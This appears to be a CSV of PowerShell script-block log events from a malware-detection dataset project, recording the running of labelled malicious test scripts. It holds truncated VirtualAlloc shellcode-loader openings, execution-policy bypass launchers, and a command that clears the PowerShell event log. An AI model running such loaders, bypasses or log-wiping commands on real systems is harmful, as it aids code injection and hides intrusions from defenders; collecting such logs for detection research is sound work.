"8/5/2026 8:19:18 AM","C:\TA\project-ta\data_spliting\test_set\malicious\66.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:19:18 AM","","150","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\66.ps1'"
"8/5/2026 8:19:09 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:19:09 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:19:09 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:19:09 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:19:09 AM","C:\TA\project-ta\data_spliting\test_set\malicious\61.ps1","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:19:09 AM","","150","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\61.ps1'"
"8/5/2026 8:18:51 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:18:51 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:18:51 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:18:51 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:18:51 AM","C:\TA\project-ta\data_spliting\test_set\malicious\52.ps1","2711","$6UhT = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/5/2026 8:18:51 AM","","150","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\52.ps1'"
"8/5/2026 8:18:39 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:18:39 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:18:39 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:18:39 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:18:39 AM","C:\TA\project-ta\data_spliting\test_set\malicious\14.ps1","2244","$qkc = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/5/2026 8:18:39 AM","","150","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\14.ps1'"
"8/5/2026 8:18:29 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:18:29 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:18:29 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:18:29 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:18:28 AM","C:\TA\project-ta\data_spliting\test_set\malicious\13.ps1","2245","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:18:28 AM","","150","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\13.ps1'"
"8/5/2026 8:18:25 AM","","9","$global:?"
"8/5/2026 8:18:24 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:18:24 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:18:24 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:18:24 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:18:24 AM","","150","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\11.ps1'"
"8/5/2026 8:17:46 AM","","6","prompt"
"8/5/2026 8:17:46 AM","","55"," wevtutil cl ""Microsoft-Windows-PowerShell/Operational"""
